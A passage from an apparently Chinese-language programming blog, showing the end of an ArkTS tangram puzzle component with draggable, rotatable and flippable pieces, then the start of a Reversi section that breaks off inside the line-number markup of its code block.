&#123; <span class="comment">// 重置数据方法</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">flipAngle</span> = <span class="number">0</span>; <span class="comment">// 重置翻转角度</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">initialOffsetX</span> = <span class="variable language_">this</span>.<span class="property">currentOffsetX</span> = <span class="variable language_">this</span>.<span class="property">defaultInitialOffsetX</span>; <span class="comment">// 重置初始X偏移量</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">initialOffsetY</span> = <span class="variable language_">this</span>.<span class="property">currentOffsetY</span> = <span class="variable language_">this</span>.<span class="property">defaultInitialOffsetY</span>; <span class="comment">// 重置初始Y偏移量</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="variable language_">this</span>.<span class="property">rotateValue</span> = <span class="variable language_">this</span>.<span class="property">defaultRotationAngle</span>; <span class="comment">// 重置旋转角度</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> <span class="attr">baseUnitLength</span>: number = <span class="number">80</span>; <span class="comment">// 基本单位长度</span></span><br><span class="line"> </span><br><span class="line">@<span class="title class_">Entry</span> <span class="comment">// 入口组件</span></span><br><span class="line">@<span class="title class_">Component</span> <span class="comment">// 定义组件</span></span><br><span class="line"><span class="keyword">export</span> struct <span class="title class_">Index</span> &#123; <span class="comment">// 主组件</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">selectedBlockIndex</span>: number = -<span class="number">1</span>; <span class="comment">// 当前选中位置</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">blocks</span>: <span class="title class_">TangramBlock</span>[] = [<span class="comment">// 七巧板数组</span></span><br><span class="line">  <span class="comment">// 小直角等腰三角形</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">TangramBlock</span>(<span class="string">&quot;#fed8e5&quot;</span>, baseUnitLength, baseUnitLength, -<span class="number">33.58</span>, -<span class="number">58.02</span>, <span class="number">135</span>,</span><br><span class="line">      [[<span class="number">0</span>, <span class="number">0</span>], [baseUnitLength, <span class="number">0</span>], [<span class="number">0</span>, baseUnitLength]]),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">TangramBlock</span>(<span class="string">&quot;#0a0bef&quot;</span>, baseUnitLength, baseUnitLength, <span class="number">78.76</span>, <span class="number">54.15</span>, <span class="number">45</span>,</span><br><span class="line">      [[<span class="number">0</span>, <span class="number">0</span>], [baseUnitLength, <span class="number">0</span>], [<span class="number">0</span>, baseUnitLength]]),</span><br><span class="line">    <span class="comment">// 中直角等腰三角形</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">TangramBlock</span>(<span class="string">&quot;#ff0d0c&quot;</span>, baseUnitLength * <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(<span class="number">2</span>), baseUnitLength * <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(<span class="number">2</span>), -<span class="number">33.16</span>, -<span class="number">1.43</span>, -<span class="number">90</span>,</span><br><span class="line">      [[<span class="number">0</span>, <span class="number">0</span>], [baseUnitLength * <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(<span class="number">2</span>), <span class="number">0</span>], [<span class="number">0</span>, baseUnitLength * <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(<span class="number">2</span>)]]),</span><br><span class="line">    <span class="comment">// 大直角等腰三角形</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">TangramBlock</span>(<span class="string">&quot;#ffa60a&quot;</span>, baseUnitLength * <span class="number">2</span>, baseUnitLength * <span class="number">2</span>, <span class="number">22.46</span>, -<span class="number">172</span>, -<span class="number">135</span>,</span><br><span class="line">      [[<span class="number">0</span>, <span class="number">0</span>], [baseUnitLength * <span class="number">2</span>, <span class="number">0</span>], [<span class="number">0</span>, baseUnitLength * <span class="number">2</span>]]),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">TangramBlock</span>(<span class="string">&quot;#3da56a&quot;</span>, baseUnitLength * <span class="number">2</span>, baseUnitLength * <span class="number">2</span>, <span class="number">135.65</span>, -<span class="number">59.34</span>, -<span class="number">45</span>,</span><br><span class="line">      [[<span class="number">0</span>, <span class="number">0</span>], [baseUnitLength * <span class="number">2</span>, <span class="number">0</span>], [<span class="number">0</span>, baseUnitLength * <span class="number">2</span>]]),</span><br><span class="line">    <span class="comment">// 正方形</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">TangramBlock</span>(<span class="string">&quot;#ffff0b&quot;</span>, baseUnitLength, baseUnitLength, <span class="number">23.07</span>, -<span class="number">1.84</span>, -<span class="number">45</span>,</span><br><span class="line">      [[<span class="number">0</span>, <span class="number">0</span>], [baseUnitLength, <span class="number">0</span>], [baseUnitLength, baseUnitLength], [<span class="number">0</span>, baseUnitLength]]),</span><br><span class="line">    <span class="comment">// 平行四边形</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">TangramBlock</span>(<span class="string">&quot;#5e0b9b&quot;</span>, baseUnitLength * <span class="number">2</span>, baseUnitLength, -<span class="number">61.53</span>, -<span class="number">85.97</span>, <span class="number">45</span>,</span><br><span class="line">      [[<span class="number">0</span>, <span class="number">0</span>], [baseUnitLength, <span class="number">0</span>], [baseUnitLength * <span class="number">2</span>, baseUnitLength], [baseUnitLength, baseUnitLength]])</span><br><span class="line">  ];</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123; <span class="comment">// 构建方法</span></span><br><span class="line">    <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">30</span> &#125;) &#123; <span class="comment">// 创建垂直布局</span></span><br><span class="line">      <span class="title class_">Stack</span>() &#123; <span class="comment">// 创建堆叠布局</span></span><br><span class="line">        <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">blocks</span>, <span class="function">(<span class="params">block: TangramBlock, index: number</span>) =&gt;</span> &#123; <span class="comment">// 遍历七巧板数组</span></span><br><span class="line">          <span class="title class_">Stack</span>() &#123; <span class="comment">// 创建堆叠布局</span></span><br><span class="line">            <span class="title class_">Polygon</span>(&#123; <span class="attr">width</span>: block.<span class="property">width</span>, <span class="attr">height</span>: block.<span class="property">height</span> &#125;)<span class="comment">// 绘制多边形</span></span><br><span class="line">              .<span class="title function_">points</span>(block.<span class="property">points</span>)<span class="comment">// 设置多边形顶点坐标</span></span><br><span class="line">              .<span class="title function_">fill</span>(block.<span class="property">color</span>)<span class="comment">// 填充颜色</span></span><br><span class="line">              .<span class="title function_">draggable</span>(<span class="literal">false</span>)<span class="comment">// 长按不可拖动</span></span><br><span class="line">              .<span class="title function_">rotate</span>(&#123; <span class="attr">angle</span>: block.<span class="property">rotationAngle</span> &#125;) <span class="comment">// 旋转角度</span></span><br><span class="line">          &#125;</span><br><span class="line">          .<span class="title function_">rotate</span>(&#123;</span><br><span class="line">            <span class="comment">// 旋转</span></span><br><span class="line">            <span class="attr">x</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">y</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">z</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">angle</span>: block.<span class="property">flipAngle</span>,</span><br><span class="line">            <span class="attr">centerX</span>: block.<span class="property">width</span> / <span class="number">2</span>, <span class="comment">// 中心点X坐标</span></span><br><span class="line">            <span class="attr">centerY</span>: block.<span class="property">height</span> / <span class="number">2</span>, <span class="comment">// 中心点Y坐标</span></span><br><span class="line">          &#125;)</span><br><span class="line">          .<span class="title function_">width</span>(block.<span class="property">width</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">          .<span class="title function_">height</span>(block.<span class="property">height</span>) <span class="comment">// 设置高度</span></span><br><span class="line">          .<span class="title function_">onTouch</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 触摸事件</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span> = index; <span class="comment">// 设置选中索引</span></span><br><span class="line">          &#125;)</span><br><span class="line">          .<span class="title function_">draggable</span>(<span class="literal">false</span>) <span class="comment">// 长按不可拖动</span></span><br><span class="line">          .<span class="title function_">translate</span>(&#123; <span class="attr">x</span>: block.<span class="property">initialOffsetX</span>, <span class="attr">y</span>: block.<span class="property">initialOffsetY</span>, <span class="attr">z</span>: <span class="number">0</span> &#125;) <span class="comment">// 平移</span></span><br><span class="line">          .<span class="title function_">gesture</span>( <span class="comment">// 手势操作</span></span><br><span class="line">            <span class="title class_">PanGesture</span>()<span class="comment">// 拖动手势</span></span><br><span class="line">              .<span class="title function_">onActionUpdate</span>(<span class="function">(<span class="params">event: GestureEvent | <span class="literal">undefined</span></span>) =&gt;</span> &#123; <span class="comment">// 更新事件</span></span><br><span class="line">                <span class="keyword">if</span> (event) &#123;</span><br><span class="line">                  block.<span class="property">initialOffsetX</span> = block.<span class="property">currentOffsetX</span> + event.<span class="property">offsetX</span>; <span class="comment">// 更新X偏移量</span></span><br><span class="line">                  block.<span class="property">initialOffsetY</span> = block.<span class="property">currentOffsetY</span> + event.<span class="property">offsetY</span>; <span class="comment">// 更新Y偏移量</span></span><br><span class="line">                &#125;</span><br><span class="line">              &#125;)</span><br><span class="line">              .<span class="title function_">onActionEnd</span>(<span class="function">(<span class="params">event: GestureEvent | <span class="literal">undefined</span></span>) =&gt;</span> &#123; <span class="comment">// 结束事件</span></span><br><span class="line">                <span class="keyword">if</span> (event) &#123;</span><br><span class="line">                  block.<span class="property">currentOffsetX</span> = block.<span class="property">initialOffsetX</span>; <span class="comment">// 更新当前X偏移量</span></span><br><span class="line">                  block.<span class="property">currentOffsetY</span> = block.<span class="property">initialOffsetY</span>; <span class="comment">// 更新当前Y偏移量</span></span><br><span class="line">                &#125;</span><br><span class="line">              &#125;)</span><br><span class="line">          )</span><br><span class="line">          .<span class="title function_">zIndex</span>(<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span> == index ? <span class="number">1</span> : <span class="number">0</span>) <span class="comment">// 设置层级</span></span><br><span class="line">          .<span class="title function_">borderWidth</span>(<span class="number">2</span>) <span class="comment">// 边框宽度</span></span><br><span class="line">          .<span class="title function_">borderStyle</span>(<span class="title class_">BorderStyle</span>.<span class="property">Dashed</span>) <span class="comment">// 边框样式</span></span><br><span class="line">          .<span class="title function_">borderColor</span>(<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span> == index ? <span class="string">&quot;#80a8a8a8&quot;</span> : <span class="title class_">Color</span>.<span class="property">Transparent</span>) <span class="comment">// 边框颜色</span></span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">height</span>(<span class="string">&#x27;750lpx&#x27;</span>) <span class="comment">// 设置宽高</span></span><br><span class="line">      .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#e4f2f5&quot;</span>) <span class="comment">// 背景颜色</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 旋转角度计数器</span></span><br><span class="line">      <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">5</span> &#125;) &#123; <span class="comment">// 创建垂直布局，设置间距</span></span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">`旋转角度(间隔5)`</span>).<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">Black</span>) <span class="comment">// 显示旋转角度文本，设置字体颜色</span></span><br><span class="line">        <span class="title class_">Counter</span>() &#123; <span class="comment">// 创建计数器组件</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.selectedBlockIndex != -<span class="number">1</span> ? <span class="variable language_">this</span>.blocks[<span class="variable language_">this</span>.selectedBlockIndex].rotationAngle :</span></span></span><br><span class="line"><span class="subst"><span class="string">            <span class="string">&#x27;-&#x27;</span>&#125;</span>`</span>)<span class="comment">// 显示当前选中七巧板的旋转角度或占位符</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">Black</span>) <span class="comment">// 设置字体颜色</span></span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">width</span>(<span class="number">300</span>) <span class="comment">// 设置计数器宽度</span></span><br><span class="line">        .<span class="title function_">onInc</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 增加按钮的点击事件</span></span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span> != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="title function_">animateTo</span>(&#123;&#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">blocks</span>[<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span>].<span class="property">rotationAngle</span> += <span class="number">5</span>; <span class="comment">// 增加旋转角度</span></span><br><span class="line">            &#125;)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;).<span class="title function_">onDec</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 减少按钮的点击事件</span></span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span> != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="title function_">animateTo</span>(&#123;&#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">blocks</span>[<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span>].<span class="property">rotationAngle</span> -= <span class="number">5</span>; <span class="comment">// 减少旋转角度</span></span><br><span class="line">            &#125;)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 旋转角度计数器</span></span><br><span class="line">      <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">5</span> &#125;) &#123; <span class="comment">// 创建垂直布局，设置间距</span></span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">`旋转角度(间隔45)`</span>).<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">Black</span>) <span class="comment">// 显示旋转角度文本，设置字体颜色</span></span><br><span class="line">        <span class="title class_">Counter</span>() &#123; <span class="comment">// 创建计数器组件</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.selectedBlockIndex != -<span class="number">1</span> ? <span class="variable language_">this</span>.blocks[<span class="variable language_">this</span>.selectedBlockIndex].rotationAngle :</span></span></span><br><span class="line"><span class="subst"><span class="string">            <span class="string">&#x27;-&#x27;</span>&#125;</span>`</span>)<span class="comment">// 显示当前选中七巧板的旋转角度或占位符</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">Black</span>) <span class="comment">// 设置字体颜色</span></span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">width</span>(<span class="number">300</span>) <span class="comment">// 设置计数器宽度</span></span><br><span class="line">        .<span class="title function_">onInc</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 增加按钮的点击事件</span></span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span> != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="title function_">animateTo</span>(&#123;&#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">blocks</span>[<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span>].<span class="property">rotationAngle</span> += <span class="number">45</span>; <span class="comment">// 增加旋转角度</span></span><br><span class="line">            &#125;)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;).<span class="title function_">onDec</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 减少按钮的点击事件</span></span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span> != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="title function_">animateTo</span>(&#123;&#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">blocks</span>[<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span>].<span class="property">rotationAngle</span> -= <span class="number">45</span>; <span class="comment">// 减少旋转角度</span></span><br><span class="line">            &#125;)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 翻转按钮</span></span><br><span class="line">      <span class="title class_">Row</span>() &#123; <span class="comment">// 创建水平布局</span></span><br><span class="line">        <span class="title class_">Button</span>(<span class="string">&#x27;向左翻转&#x27;</span>).<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 左翻转按钮点击事件</span></span><br><span class="line">          <span class="title function_">animateTo</span>(&#123;&#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span> != -<span class="number">1</span>) &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">blocks</span>[<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span>].<span class="property">flipAngle</span> -= <span class="number">180</span>; <span class="comment">// 减少翻转角度</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="title class_">Button</span>(<span class="string">&#x27;向右翻转&#x27;</span>).<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 右翻转按钮点击事件</span></span><br><span class="line">          <span class="title function_">animateTo</span>(&#123;&#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span> != -<span class="number">1</span>) &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">blocks</span>[<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span>].<span class="property">flipAngle</span> += <span class="number">180</span>; <span class="comment">// 增加翻转角度</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">SpaceEvenly</span>) <span class="comment">// 设置宽度和内容对齐方式</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 重置和隐藏边框按钮</span></span><br><span class="line">      <span class="title class_">Row</span>() &#123; <span class="comment">// 创建水平布局</span></span><br><span class="line">        <span class="title class_">Button</span>(<span class="string">&#x27;重置&#x27;</span>).<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 重置按钮点击事件</span></span><br><span class="line">          <span class="title function_">animateTo</span>(&#123;&#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">blocks</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">blocks</span>[i].<span class="title function_">resetData</span>(); <span class="comment">// 重置七巧板数据</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span> = -<span class="number">1</span>; <span class="comment">// 重置选中索引</span></span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="title class_">Button</span>(<span class="string">&#x27;隐藏边框&#x27;</span>).<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 隐藏边框按钮点击事件</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span> = -<span class="number">1</span>; <span class="comment">// 重置选中索引</span></span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">SpaceEvenly</span>) <span class="comment">// 设置宽度和内容对齐</span></span><br><span class="line">    &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Reversi"><a href="#Reversi" class="headerlink" title="Reversi"></a>Reversi</h1><p>翻转棋（Reversi）、奥赛罗棋（Othello）、苹果棋或正反棋（Anti reversi） 黑白棋</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span 